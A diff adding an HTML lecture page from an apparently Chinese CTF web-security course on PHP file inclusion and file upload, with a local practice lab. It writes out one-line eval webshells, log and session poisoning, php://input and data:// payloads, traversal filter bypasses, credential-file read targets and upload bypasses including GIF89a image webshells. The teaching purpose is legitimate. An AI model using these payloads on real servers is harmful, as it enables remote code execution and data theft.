@@ -1,0 +1,1207 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>其四 · 文件包含与文件上传 | 竹隐</title>
+<meta name="description" content="一个负责把代码写进服务器，一个负责让服务器执行它。文件包含、一句话木马、伪协议、上传绕过、解析漏洞与条件竞争。">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='5' fill='%23a83a2c'/%3E%3Ctext x='32' y='46' font-size='38' text-anchor='middle' fill='%23f8f2e6' font-family='KaiTi,STKaiti,serif'%3E%E7%AB%B9%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="../assets/css/zhulin.css">
+<link rel="stylesheet" href="../assets/css/tools.css">
+</head>
+<body>
+
+<header class="site-head">
+  <a class="brand" href="../index.html">
+    <span class="seal">竹</span>
+    <span class="brand-text">
+      <b>竹隐</b>
+      <em>JNSEC &middot; WEB 26</em>
+    </span>
+  </a>
+  <nav class="site-nav" aria-label="站点导航">
+    <a href="../index.html">山门</a>
+    <a href="week01.html">其一</a>
+    <a href="week02.html">其二</a>
+    <a href="week03.html">其三</a>
+    <a href="week04.html" aria-current="page">其四 · 文件</a>
+    <a href="../roadmap.html">路线</a>
+  </nav>
+</header>
+
+<main class="reader">
+
+  <article>
+    <div class="juan-title">
+      <span class="plate">其四</span>
+      <h1>文件包含与文件上传</h1>
+    </div>
+
+    <p class="juan-deck">
+      这两个漏洞总是成对出现，原因很实在：
+      <strong>上传负责把代码写进服务器，包含负责让服务器执行它。</strong>
+      一个给刀，一个给手。合起来，就是一次 RCE。
+    </p>
+
+    <div class="juan-meta">
+      <span>第四讲</span>
+      <span class="dot">&middot;</span>
+      <span>包含的四条路 + 上传的八种绕法</span>
+      <span class="dot">&middot;</span>
+      <span>含 1 个文件靶场</span>
+    </div>
+
+    <div class="prose">
+
+      <h2 id="s-intro" class="nonum" style="margin-top:2.4rem">这一讲在讲什么</h2>
+
+      <p>
+        前三讲的洞，大多停在"能读到不该读的东西"。
+        这一讲不一样 —— 它讨论的是<strong>怎么让服务器跑你写的代码</strong>。
+      </p>
+
+      <p>
+        路径只有两条：
+      </p>
+
+      <ul>
+        <li>
+          <strong>文件包含</strong> —— 服务器本来就有个功能，能把别的文件当代码执行。
+          如果你的输入能决定"包含哪个文件"，那就能让它执行你的文件。
+        </li>
+        <li>
+          <strong>文件上传</strong> —— 服务器允许你传文件。如果传上去的文件能被执行，
+          那也是一样的效果。
+        </li>
+      </ul>
+
+      <p>
+        单独看，这两条路都可能被堵死。但真实环境里它们常常同时存在：
+        上传点只允许图片，可旁边有个文件包含 —— 传个图片马，包含它，照样执行。
+        <strong>这就是为什么讲台上把这两块放在一起讲。</strong>
+      </p>
+
+
+      <h2 id="s-inc">文件包含：把文件当代码执行</h2>
+
+      <p>
+        C 语言用 <code>#include</code> 引头文件，Python 用 <code>import</code> 引库，
+        PHP 也有一套类似的东西，但行为不太一样。
+      </p>
+
+      <p>
+        关键的一点：<strong>PHP 的包含，会把那个文件当成 PHP 代码来解析</strong>，
+        哪怕它的后缀是 <code>.txt</code>、<code>.jpg</code>。
+      </p>
+
+      <p>
+        具体怎么解析？
+      </p>
+
+      <ul>
+        <li>不在 <code>&lt;?php ?&gt;</code> 里的部分，<strong>原样输出</strong></li>
+        <li>在 <code>&lt;?php ?&gt;</code> 里的部分，<strong>当代码执行</strong></li>
+      </ul>
+
+      <p>举个例子。建一个 <code>test.php</code>：</p>
+
+      <pre><code>&lt;?php include '1.txt'; ?&gt;</code></pre>
+
+      <p>同目录放一个 <code>1.txt</code>：</p>
+
+      <pre><code>123456
+&lt;?php echo 'hello'; ?&gt;
+include 'world'</code></pre>
+
+      <p>访问 test.php，输出是：</p>
+
+      <pre><code>123456
+hello  include 'world'</code></pre>
+
+      <p>
+        看出来了吧：<code>123456</code> 原样输出，<code>hello</code> 是被执行的，
+        最后那行因为没有 <code>&lt;?php</code> 包裹，也原样输出。
+      </p>
+
+      <div class="note secret">
+        <span class="note-tag">这意味着什么</span>
+        <p>
+          <strong>只要你能控制被包含的文件，就能在里面写 PHP 代码，让它执行。</strong>
+          而这个"文件"不一定得是 <code>.php</code> —— 图片、日志、Session 文件，都能当载体。
+        </p>
+        <p>
+          后面所有技巧，追根到底都是在解决一个问题：
+          <em>怎么让服务器去包含一个"我写入了内容"的文件。</em>
+        </p>
+      </div>
+
+      <h3>四个包含函数</h3>
+
+      <p>名字都差不多，差别只在两件事上：找不到文件时的态度，和重复包含时的态度。</p>
+
+      <table>
+        <thead>
+          <tr><th style="width:9rem">函数</th><th style="width:9rem">找不到文件</th><th style="width:7rem">重复包含</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>include()</code></td><td>警告，继续跑</td><td>再次包含</td></tr>
+          <tr><td><code>include_once()</code></td><td>警告，继续跑</td><td>跳过</td></tr>
+          <tr><td><code>require()</code></td><td><strong>报错，直接退出</strong></td><td>再次包含</td></tr>
+          <tr><td><code>require_once()</code></td><td><strong>报错，直接退出</strong></td><td>跳过</td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        做题时这个区别有意义：如果用的是 <code>require</code>，包含失败页面上会报错，
+        你能从报错信息里看到它拼出来的完整路径 —— <strong>等于白送你一个调试手段</strong>。
+      </p>
+
+      <h3>什么样的代码会中招</h3>
+
+      <pre><code>&lt;?php
+$file = $_GET['file'];
+include $file;
+?&gt;</code></pre>
+
+      <p>
+        四行，就这么简单。访问
+        <code>?file=/etc/passwd</code>，页面就把系统的用户列表打出来了。
+      </p>
+
+      <p>
+        这个洞的专业名字叫 <strong>LFI（本地文件包含）</strong>。
+        如果参数里能填 <code>http://</code> 开头的远程地址，让 PHP 去别的服务器拉文件下来执行，
+        那就叫 <strong>RFI（远程文件包含）</strong> —— 前提是 php.ini 里
+        <code>allow_url_include</code> 是开的（现在默认关）。
+      </p>
+
+
+      <h2 id="s-shell">一句话木马，和它能干什么</h2>
+
+      <p>
+        文件包含如果只能读文件，那顶多是信息泄露。真正让它变成 RCE 的，
+        是<strong>包含一个内容可控的文件</strong>。
+      </p>
+
+      <p>而被包含的文件里写什么？写这个：</p>
+
+      <pre><code>&lt;?php @eval($_POST['a']); ?&gt;</code></pre>
+
+      <p>
+        一行 PHP，业内叫「一句话木马」。拆开看四部分：
+      </p>
+
+      <table>
+        <thead><tr><th style="width:9rem">部分</th><th>作用</th></tr></thead>
+        <tbody>
+          <tr><td><code>$_POST['a']</code></td><td>从请求体里取名为 <code>a</code> 的参数</td></tr>
+          <tr><td><code>eval(...)</code></td><td>把取到的字符串<strong>当 PHP 代码执行</strong></td></tr>
+          <tr><td><code>@</code></td><td>抑制报错，别让页面吐一堆 warning 暴露自己</td></tr>
+          <tr><td>末尾的 <code>;</code></td><td><strong>不能丢</strong>。少了它就是语法错误，整行白写</td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        所以当你 POST 一个 <code>a=system('cat /flag');</code> 过去，
+        <code>eval</code> 就把它当代码跑了，flag 就出来了。
+      </p>
+
+      <p>
+        <strong>一句话木马的本质：开一个口子，让任意 PHP 代码从外面进来执行。</strong>
+      </p>
+
+      <p>两个常用变体：</p>
+
+      <pre><code>&lt;?php @eval($_GET[1]); ?&gt;    // 实测方便：地址栏直接打 ?1=phpinfo();
+&lt;?php @eval($_POST['a']); ?&gt; // 蚁剑这类工具默认发 POST</code></pre>
+
+      <p>
+        <code>$_GET[1]</code> 里那个 <code>1</code> 不加引号，是为了少打两个字符 —— 不是语法必须。
+      </p>
+
+      <div class="note">
+        <span class="note-tag">为什么工具喜欢 POST</span>
+        <p>
+          因为 GET 的 payload 会进 URL、进日志、被各种地方记录。
+          POST 在请求体里，隐蔽一点，也方便放长内容。
+        </p>
+      </div>
+
+      <h3>路径：先搞清楚自己在哪</h3>
+
+      <p>构造包含路径时，三个符号要分清：</p>
+
+      <ul>
+        <li><code>/</code> —— 根目录</li>
+        <li><code>./</code> —— 当前目录</li>
+        <li><code>../</code> —— 上一级目录</li>
+      </ul>
+
+      <p>
+        开头这三者都没有，默认就按当前目录算。
+      </p>
+
+      <p>
+        还有一个反直觉的点：<strong><code>../</code> 多了不会报错</strong>。
+        超出根目录之后再往上，还是指向根目录。所以你看到一长串
+        <code>../../../../../../</code> 不用数，够多就行。
+      </p>
+
+      <h3>能读文件之后，看什么</h3>
+
+      <p>
+        拿到任意文件读取，别只顾着看 <code>/etc/passwd</code>（那个只能证明洞存在）。
+        真正的目标是<strong>能推进下一步的东西</strong>：
+      </p>
+
+      <table>
+        <thead><tr><th style="width:14rem">路径</th><th>里面通常有什么</th></tr></thead>
+        <tbody>
+          <tr><td><code>/etc/passwd</code></td><td>用户列表。看有哪些用户、能不能登录</td></tr>
+          <tr><td><code>/etc/shadow</code></td><td>密码哈希。一般没权限读，读到了就是大事</td></tr>
+          <tr><td><code>/proc/self/environ</code></td><td>当前进程的环境变量。<strong>很多秘密藏在这儿</strong></td></tr>
+          <tr><td><code>/proc/self/cmdline</code></td><td>当前进程的启动命令，能看出路径和服务类型</td></tr>
+          <tr><td><code>/proc/1/environ</code></td><td>PID 1 的环境变量</td></tr>
+          <tr><td><code>/etc/crontab</code></td><td>定时任务。如果能写进去……</td></tr>
+          <tr><td><code>/flag</code></td><td>CTF 里最常见的落点</td></tr>
+        </tbody>
+      </table>
+
+      <p>配置文件里往往有更值钱的东西：</p>
+
+      <ul>
+        <li><code>/etc/httpd/conf/httpd.conf</code>、<code>/etc/nginx/nginx.conf</code> —— Web 服务器配置，能看出网站根目录、日志路径</li>
+        <li><code>/etc/my.cnf</code> —— MySQL 配置，可能有数据库账号</li>
+        <li><code>/etc/redhat-release</code>、<code>/etc/issue</code> —— 系统版本，用来找已知漏洞</li>
+        <li><code>/etc/sysconfig/iptables</code> —— 防火墙规则</li>
+      </ul>
+
+      <p>
+        扫描这些路径的时候，Burp 的 Intruder 比手工一个个试快得多。
+      </p>
+
+
+      <h2 id="s-trick">进阶：日志、Session、伪协议</h2>
+
+      <p>
+        能读文件了，但读了一圈没找到 flag，也找不到能写入的地方 —— 怎么办？
+      </p>
+
+      <p>想想：服务器上有没有<strong>"我往里面写过东西"</strong>的文件？</p>
+
+      <h3>日志包含</h3>
+
+      <p>
+        有。访问日志。
+      </p>
+
+      <p>
+        每次请求，服务器都会往 <code>access.log</code> 里记一行，
+        里面包含你的 IP、请求的 URL、User-Agent、Referer。
+        <strong>而 UA 和 Referer 是你随便写的。</strong>
+      </p>
+
+      <p>一条 Nginx 日志长这样：</p>
+
+      <pre><code>127.0.0.1 - - [16/Oct/2023:18:46:47 +0800] "GET /DVWA/favicon.ico HTTP/1.1" 200 1406 "http://localhost/DVWA/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."</code></pre>
+
+      <p>
+        最后那个引号里就是 UA。如果你把它改成
+        <code>&lt;?php @eval($_POST[a]);?&gt;</code>，
+        这行代码就被写进日志文件了。
+      </p>
+
+      <p>
+        然后再包含日志文件 —— 它里面的 PHP 段就执行了。
+      </p>
+
+      <div class="note pit">
+        <span class="note-tag">一个必踩的坑</span>
+        <p>
+          <strong>不能直接在地址栏里发</strong>。浏览器会把 URL 里的
+          <code>&lt;</code>、<code>?</code> 这些做 URL 编码，
+          写进日志的是编码后的字符串 —— 编码过的 PHP 代码不会执行。
+        </p>
+        <p>
+          正确姿势：Burp 抓包，把 UA 改成原始字符放过去。这样日志里存的就是原文。
+        </p>
+      </div>
+
+      <p>
+        日志在哪儿？看服务器配置。phpstudy 的话在
+        <code>Extensions/Apache/logs</code> 或 <code>Nginx/logs</code> 下面；
+        有 phpinfo 的话，也能从里面看。
+      </p>
+
+      <h3>Session 包含</h3>
+
+      <p>
+        第二条路：Session 文件。
+      </p>
+
+      <p>
+        Session 和 Cookie 有点像，区别是<strong>数据存在服务器上</strong>。
+        用户一访问，服务器就给他分配一个 <code>PHPSESSID</code>，
+        然后在 <code>session.save_path</code> 目录下建一个
+        <code>sess_PHPSESSID</code> 的文件。请求结束时，Session 内容写进去。
+      </p>
+
+      <p>
+        所以：只要你的某个输入被存进了 Session，你就<strong>往服务器上写进了一个文件</strong>。
+        再包含它 —— 执行。
+      </p>
+
+      <pre><code>&lt;?php
+session_start();
+// ...
+$_SESSION['username'] = base64_encode($username);   // 用户输入进了 session
+?&gt;</code></pre>
+
+      <p>Session 文件一般在：</p>
+
+      <ul>
+        <li><code>/var/lib/php/sess_PHPSESSID</code></li>
+        <li><code>/tmp/sess_PHPSESSID</code></li>
+        <li><code>/tmp/sessions/sess_PHPSESSID</code></li>
+      </ul>
+
+      <p>
+        那个 <code>PHPSESSID</code> 就是你 Burp 里看到的那串 Cookie。
+        <strong>最稳的办法是看 phpinfo 里的 <code>session.save_path</code></strong>，
+        没有的话就这几个地方挨个试。
+      </p>
+
+      <div class="note secret">
+        <span class="note-tag">一条通用思路</span>
+        <p>
+          日志包含和 Session 包含，本质是同一个思路：
+          <strong>找一个"我能写入内容、又能被包含"的文件</strong>。
+        </p>
+        <p>
+          同类的还有：上传的临时文件（<code>/tmp/phpXXXXXX</code>）、
+          <code>/proc/self/environ</code>（UA 会被写进这里的 <code>HTTP_USER_AGENT</code>）、
+          邮件日志、甚至数据库文件。思路打开，载体到处都是。
+        </p>
+      </div>
+
+      <h3>伪协议：路径的另一种写法</h3>
+
+      <p>
+        伪协议是 PHP 的一套"协议包装器"。长得像路径，背后接的不是磁盘文件。
+        用法都一样：直接当 <code>include</code> 的参数。
+      </p>
+
+      <table>
+        <thead><tr><th style="width:13rem">写法</th><th>作用</th><th style="width:9rem">条件</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><code>file://</code></td>
+            <td>读本地文件。<code>include 'file:///etc/passwd';</code></td>
+            <td>不受 allow_url_* 限制</td>
+          </tr>
+          <tr>
+            <td><code>php://filter</code></td>
+            <td>读文件源码（编码后输出，不执行）</td>
+            <td>默认可用</td>
+          </tr>
+          <tr>
+            <td><code>php://input</code></td>
+            <td>把 POST 请求体当 PHP 代码执行</td>
+            <td><code>allow_url_include=on</code></td>
+          </tr>
+          <tr>
+            <td><code>data://</code></td>
+            <td>把 URL 里的字符串当代码执行</td>
+            <td>allow_url_fopen + allow_url_include</td>
+          </tr>
+          <tr>
+            <td><code>zip://</code></td>
+            <td>读压缩包内的文件并执行</td>
+            <td>无</td>
+          </tr>
+          <tr>
+            <td><code>phar://</code></td>
+            <td>同上，写法不同</td>
+            <td>无</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h4>php://filter —— 读源码，不执行</h4>
+
+      <p>
+        <code>include 'index.php'</code> 会把源码当代码跑掉，页面上只剩输出，
+        你看不到源码。<code>php://filter</code> 解决的就是这个问题：
+      </p>
+
+      <pre><code>?file=php://filter/convert.base64-encode/resource=/var/www/html/index.php</code></pre>
+
+      <p>
+        它先把文件内容 base64 编码，再输出。<strong>编码后的内容不会被当作 PHP 解析</strong>，
+        所以你就能看到源码了 —— 复制出来解个 base64 就行。
+      </p>
+
+      <p>
+        base64 被过滤了？还有别的过滤器，比如
+        <code>convert.iconv.SJIS*.UCS-4*/resource=/</code>、<code>string.strip_tags</code>。
+        这块深挖下去很复杂（还有 FilterChain 之类的进阶用法），入门阶段知道 base64 这个就够。
+      </p>
+
+      <h4>php://input —— 把请求体当代码</h4>
+
+      <pre><code>GET /input.php?file=php://input HTTP/1.1
+Host: localhost
+Content-Length: 25
+
+&lt;?php system('whoami');?&gt;</code></pre>
+
+      <p>
+        <code>include</code> 读了请求体并执行，<code>whoami</code> 的结果回显在页面上。
+        前提是 <code>allow_url_include</code> 开着。
+      </p>
+
+      <h4>data:// —— 把字符串当文件</h4>
+
+      <pre><code>?file=data://text/plain,&lt;?php phpinfo();?&gt;
+
+// 加一层 base64，绕 &lt; ? 被过滤
+?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code></pre>
+
+      <h4>zip:// 和 phar:// —— 藏在压缩包里</h4>
+
+      <p>
+        这两个最有意思：<strong>它们不看外层文件的扩展名，只看内容是不是合法的压缩包结构</strong>。
+        所以 <code>.png</code>、<code>.jpg</code> 都能当压缩包用。
+      </p>
+
+      <pre><code>zip:///var/www/html/1.zip%23php.txt      // # 要写成 %23
+phar://a.png/shell.php                    // phar 用 / 分隔，不用 %23</code></pre>
+
+      <p>
+        用法：把木马写进一个文件 → 连同它压成 zip → 上传（改后缀成 png 也行）→
+        用 <code>zip://</code> 或 <code>phar://</code> 包含进去。
+      </p>
+
+      <p>
+        <code>zip://</code> 被 WAF 拦了，可以换 <code>bzip2://</code>、<code>zlib://</code>，作用类似。
+      </p>
+
+      <div class="note">
+        <span class="note-tag">一个小技巧</span>
+        <p>
+          如果上传点会"解压 zip 并检查包内文件名"，那就把包内的木马改成
+          <code>.jpg</code> 再压缩 —— 骗过检查，包含时照样能执行。
+        </p>
+      </div>
+
+      <div class="lab">
+        <div class="lab-sign">
+          <span class="stamp">实操</span>
+          <h3>打一遍文件靶场</h3>
+        </div>
+        <ol class="step">
+          <li>
+            跟着一键启动起来，或者手动进目录跑：
+            <div class="cmd"><code>php -S 127.0.0.1:8084 router.php</code></div>
+            在 <code>lab/file_lab/</code> 下执行。地址 <code>http://127.0.0.1:8084/</code>。
+          </li>
+          <li>第一关：无过滤的包含。猜猜 <code>secret.txt</code> 在哪儿。</li>
+          <li>第二关：代码给路径加了前缀，得想办法跳出去。</li>
+          <li>第三关：上传点什么都不查，传个一句话上去试试。</li>
+          <li>第四关：上传点查了 Content-Type，想想这个值是谁写的。</li>
+        </ol>
+      </div>
+
+      <h2 id="s-inc-bypass">包含的绕过：前缀、后缀、过滤器</h2>
+
+      <p>
+        真实代码很少让你随便填路径。常见两种限制：给路径<strong>加前缀</strong>，
+        或者加<strong>后缀</strong>。两种都有绕法。
+      </p>
+
+      <h3>指定了前缀</h3>
+
+      <pre><code>&lt;?php
+$file = $_GET['file'];
+include '/var/www/html/' . $file;
+?&gt;</code></pre>
+
+      <p>
+        想法很直接：把包含限制在这个目录里。但 <code>../</code> 是文件系统层面的，
+        代码管不着：
+      </p>
+
+      <pre><code>?file=../../../../../../etc/passwd
+
+拼出来：/var/www/html/../../../../../../etc/passwd
+        ↑ 往上跳六层，就到根目录了</code></pre>
+
+      <p>
+        如果 <code>../</code> 被过滤了呢？三种常见绕法：
+      </p>
+
+      <ul>
+        <li><strong>URL 编码</strong> —— <code>%2e%2e%2f</code>，解码后才是 <code>../</code></li>
+        <li><strong>双写</strong> —— <code>....//</code>。过滤器删掉中间的 <code>../</code>，剩下的正好拼回 <code>../</code></li>
+        <li><strong>编码差异</strong> —— <code>%C0%AF</code> 在某些 Java 容器里会被解码成 <code>/</code>（原理类似第三讲的宽字节）</li>
+      </ul>
+
+      <h3>指定了后缀</h3>
+
+      <pre><code>&lt;?php
+$file = $_GET['file'];
+include $file . '.jpg';
+?&gt;</code></pre>
+
+      <p>
+        这个麻烦点：你想包含的路径后面总被强行加上 <code>.jpg</code>。
+        三种绕法，<strong>但注意前提</strong> —— 前两种只对<em>远程包含</em>有效：
+      </p>
+
+      <ol>
+        <li>
+          <strong>问号绕过</strong>。<code>?file=http://yourhost/1.php?</code>
+          后面的 <code>.jpg</code> 被当成 URL 的查询参数，不再是文件名的一部分。
+        </li>
+        <li>
+          <strong>井号截断</strong>。<code>#</code> 后面算片段，也不进文件名。
+          但直接传 <code>#</code> 不行，要 URL 编码成 <code>%23</code>。
+        </li>
+        <li>
+          <strong>data 伪协议</strong>。这个连远程服务器都不需要：
+          <code>?file=data://text/plain,&lt;?php ...?&gt;</code> ——
+          反正 <code>.jpg</code> 拼在后面，data 协议会把它当成数据的一部分。
+        </li>
+      </ol>
+
+
+      <h2 id="s-upload">文件上传：从表单到落盘</h2>
+
+      <p>
+        包含是"让服务器执行已有的文件"，上传是"把文件送进服务器"。
+        两条路合起来，就是完整的攻击链。
+      </p>
+
+      <h3>先认认文件是什么</h3>
+
+      <p>
+        计算机里的文件都是十六进制字节。记事本只能显示可见字符，
+        看不到真正的内容 —— 而且用记事本打开再保存，还可能把编码搞坏。
+        要看全貌得用十六进制查看器。
+      </p>
+
+      <p>
+        文件开头那几个字节叫<strong>魔数（magic number）</strong>，用来标识文件类型：
+      </p>
+
+      <table>
+        <thead><tr><th style="width:6rem">类型</th><th style="width:12rem">文件头</th><th>备注</th></tr></thead>
+        <tbody>
+          <tr><td>jpg</td><td><code>FF D8 FF</code></td><td>结尾通常是 <code>FF D9</code></td></tr>
+          <tr><td>gif</td><td><code>GIF89a</code></td><td><strong>全是可见字符，做图片马最方便</strong></td></tr>
+          <tr><td>png</td><td><code>89 50 4E 47</code></td><td></td></tr>
+          <tr><td>zip</td><td><code>50 4B 03 04</code></td><td>PK 开头</td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        还有个关键认知：<strong>Windows 下后缀名只是给系统看的标识</strong>，
+        改后缀不会改变文件内部结构。<code>shell.php</code> 改成 <code>shell.jpg</code>，
+        里面还是那段 PHP 代码。
+      </p>
+
+      <p>
+        那 <code>include '1.jpg'</code> 会输出什么？—— 把它当 PHP 解析，
+        里面的 <code>FF D8 FF</code> 这些不可见字节原样输出（浏览器里看到一堆乱码），
+        而 <code>&lt;?php ... ?&gt;</code> 那部分会被执行。
+      </p>
+
+      <h3>一个上传页面的样子</h3>
+
+      <pre><code>&lt;form action="upload.php" method="post" enctype="multipart/form-data"&gt;
+    &lt;input type="file" name="file" id="file"&gt;
+    &lt;input type="submit" name="submit" value="提交"&gt;
+&lt;/form&gt;</code></pre>
+
+      <p>
+        <code>enctype="multipart/form-data"</code> <strong>必须有</strong>。
+        不加这个，表单只会把文件名传过去，文件本身根本不上传。
+      </p>
+
+      <h3>后端怎么收</h3>
+
+      <pre><code>&lt;?php
+$target_dir  = "D:/phpstudy_pro/WWW/ezupload/upload/";
+$target_file = $target_dir . basename($_FILES["file"]["name"]);
+
+if ($_FILES["file"]["error"] &gt; 0) {
+    echo "错误：" . $_FILES["file"]["error"];
+} else {
+    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
+        echo "上传成功";
+    }
+}
+?&gt;</code></pre>
+
+      <p><code>$_FILES</code> 这个超全局数组，五个字段要认全：</p>
+
+      <table>
+        <thead><tr><th style="width:14rem">字段</th><th>含义</th><th style="width:7rem">谁写的</th></tr></thead>
+        <tbody>
+          <tr><td><code>['name']</code></td><td>上传时的原始文件名</td><td><strong>客户端</strong></td></tr>
+          <tr><td><code>['type']</code></td><td>MIME 类型</td><td><strong>客户端</strong></td></tr>
+          <tr><td><code>['tmp_name']</code></td><td>服务器上的临时文件路径</td><td>服务器</td></tr>
+          <tr><td><code>['error']</code></td><td>错误码</td><td>服务器</td></tr>
+          <tr><td><code>['size']</code></td><td>文件大小（字节）</td><td>服务器</td></tr>
+        </tbody>
+      </table>
+
+      <div class="note secret">
+        <span class="note-tag">这张表最重要的一列</span>
+        <p>
+          <strong><code>name</code> 和 <code>type</code> 是客户端自己写进请求里的。</strong>
+          你传 <code>shell.php</code>，<code>name</code> 就是 <code>shell.php</code>；
+          你写 <code>Content-Type: image/jpeg</code>，<code>type</code> 就是 <code>image/jpeg</code>。
+        </p>
+        <p>
+          所以：<strong>后端如果只检查这两个字段，等于什么都没检查。</strong>
+          后面一半的绕过手法，都是从这个事实长出来的。
+        </p>
+      </div>
+
+      <h3>上传报文长什么样</h3>
+
+      <pre><code>POST /ezupload/upload.php HTTP/1.1
+Host: localhost
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhyYhgDANYaiWoEGK
+Content-Length: 332
+
+------WebKitFormBoundaryhyYhgDANYaiWoEGK
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/octet-stream
+
+&lt;?php echo 1234; ?&gt;
+------WebKitFormBoundaryhyYhgDANYaiWoEGK
+Content-Disposition: form-data; name="submit"
+
+提交
+------WebKitFormBoundaryhyYhgDANYaiWoEGK--</code></pre>
+
+      <p>
+        三个要点：
+      </p>
+
+      <ul>
+        <li>
+          <code>boundary</code> 是分隔符，后面那串随机字符由浏览器生成。
+          报文里每个字段前面都有一条 <code>------WebKitFormBoundary...</code>
+        </li>
+        <li>
+          <strong><code>filename="shell.php"</code> 就对应 <code>$_FILES['file']['name']</code></strong> ——
+          这就是你能改的地方
+        </li>
+        <li>
+          <strong><code>Content-Type: application/octet-stream</code> 对应 <code>['type']</code></strong> ——
+          同样是你改的
+        </li>
+      </ul>
+
+      <h3>没有前端页面也能传：Postman</h3>
+
+      <p>
+        有时候目标服务器有 <code>$_FILES</code> 接收，但没给你上传的页面。
+        那就自己构造请求。Postman 是干这个的工具 —— 注册个免费账号就能用，
+        比手写 multipart 报文舒服得多。
+      </p>
+
+      <h3>洞是怎么产生的</h3>
+
+      <p>
+        一句话：<strong>文件传上去了，而且传到了能被访问、被执行的地方</strong>。
+      </p>
+
+      <pre><code># 上传 1.php，内容是
+&lt;?php @eval($_GET[1]); ?&gt;
+
+# 提示存到了 /upload 目录
+# 访问 /ezupload/upload/1.php?1=phpinfo();
+# 页面弹出 phpinfo —— 命令执行了</code></pre>
+
+      <p>
+        从这一步开始，你就有了一个「Webshell」——一个能执行任意 PHP 的入口。
+      </p>
+
+
+      <h2 id="s-up-bypass">上传绕过：一层一层剥</h2>
+
+      <p>
+        真实的站不会让你直接传 <code>.php</code>。它通常会一层一层检查：
+        前端有没有拦、MIME 对不对、后缀在不在名单里、文件内容像不像图片。
+        <strong>每加一层，就多一种绕法。</strong>
+      </p>
+
+      <h3>第一层：前端验证 —— 最好绕</h3>
+
+      <p>
+        前端验证（JS 检查后缀之类）的本质是"浏览器替你先看一遍"。
+        而浏览器是你的，所以：
+      </p>
+
+      <ul>
+        <li>禁用 JavaScript</li>
+        <li>直接改前端代码</li>
+        <li><strong>先传一个合规的文件，让它通过前端检查；抓到包之后，再把包里的文件名和内容换成恶意文件</strong></li>
+      </ul>
+
+      <p>第三种最通用 —— 因为前端只影响"请求发不发得出去"，不影响"请求长什么样"。</p>
+
+      <h3>第二层：MIME 检查</h3>
+
+      <p>
+        如果后端这样写：
+      </p>
+
+      <pre><code>if ($_FILES["file"]["type"] == "image/jpeg") { ... }</code></pre>
+
+      <p>
+        那它检查的就是报文里 <code>Content-Type</code> 那一行。
+        抓包，把 <code>application/octet-stream</code> 改成 <code>image/jpeg</code>，过了。
+      </p>
+
+      <p>常见 MIME 类型记几个：</p>
+
+      <table>
+        <thead><tr><th style="width:13rem">MIME</th><th>含义</th></tr></thead>
+        <tbody>
+          <tr><td><code>text/plain</code></td><td>纯文本</td></tr>
+          <tr><td><code>text/html</code></td><td>HTML 文档</td></tr>
+          <tr><td><code>image/jpeg</code></td><td>JPEG 图像</td></tr>
+          <tr><td><code>image/png</code></td><td>PNG 图像</td></tr>
+          <tr><td><code>image/gif</code></td><td>GIF 图像</td></tr>
+          <tr><td><code>application/octet-stream</code></td><td>二进制流（默认）</td></tr>
+          <tr><td><code>application/pdf</code></td><td>PDF</td></tr>
+        </tbody>
+      </table>
+
+      <h3>第三层：后缀黑名单</h3>
+
+      <p>
+        后端检查文件名后缀，不允许 <code>.php</code>。绕法一大堆：
+      </p>
+
+      <table>
+        <thead><tr><th style="width:8rem">手法</th><th>例子</th><th>说明</th></tr></thead>
+        <tbody>
+          <tr>
+            <td>冷门后缀</td>
+            <td><code>.php3</code> <code>.php4</code> <code>.php5</code> <code>.phtml</code> <code>.pht</code> <code>.phps</code></td>
+            <td>黑名单经常漏。能不能执行看中间件配置，老环境默认就认</td>
+          </tr>
+          <tr>
+            <td>大小写</td>
+            <td><code>.Php</code> <code>.PHP</code></td>
+            <td>Windows 下的 Apache / IIS 一般认；Linux 通常不认（区分大小写）</td>
+          </tr>
+          <tr>
+            <td>双写</td>
+            <td><code>.pphphp</code></td>
+            <td>后端把 <code>php</code> 替换成空格后，正好拼回 <code>.php</code></td>
+          </tr>
+          <tr>
+            <td>Windows 命名</td>
+            <td><code>1.php.</code>、<code>1.php[空格]</code></td>
+            <td>Windows 会自动去掉结尾的点和空格，存下来还是 <code>1.php</code>。尾空格得抓包改</td>
+          </tr>
+          <tr>
+            <td><code>%00</code> 截断</td>
+            <td><code>1.php%00.jpg</code></td>
+            <td>只对 PHP &lt; 5.3.4 有效。C 层遇到 <code>\0</code> 就认为字符串结束</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="note pit">
+        <span class="note-tag">%00 怎么打进报文</span>
+        <p>
+          直接在 Burp 里敲 <code>%00</code> 是不行的（那是字面的百分号）。
+          两个办法：
+        </p>
+        <ul>
+          <li>选中 <code>%00</code>，右键 → Convert → URL → URL-decode，把它变成真正的空字节</li>
+          <li>或者先用一个占位符（比如 <code>+</code>），切到 Hex 视图，把 <code>2b</code> 改成 <code>00</code></li>
+        </ul>
+      </div>
+
+      <h3>第四层：文件内容检查</h3>
+
+      <p>
+        后端读文件前几个字节，看是不是 <code>FF D8 FF</code>（jpg）或者 <code>GIF89a</code>（gif）。
+        这种检查叫<strong>魔数检测</strong>。
+      </p>
+
+      <p>
+        绕法就是<strong>图片马</strong>：先传一张正常图片，抓包，在文件末尾追加 PHP 代码：
+      </p>
+
+      <pre><code>GIF89a&lt;?php @eval($_POST['a']); ?&gt;</code></pre>
+
+      <p>
+        这样它既通过魔数检查（开头是 GIF89a），又包含可执行代码。
+      </p>
+
+      <p>
+        为什么推荐 gif？因为 <code>GIF89a</code> 全是可见字符，在 Burp 里直接手敲就行，
+        不用十六进制编辑器。
+      </p>
+
+      <div class="note secret">
+        <span class="note-tag">图片马的关键用法</span>
+        <p>
+          <strong>图片马直接访问通常打不动。</strong>
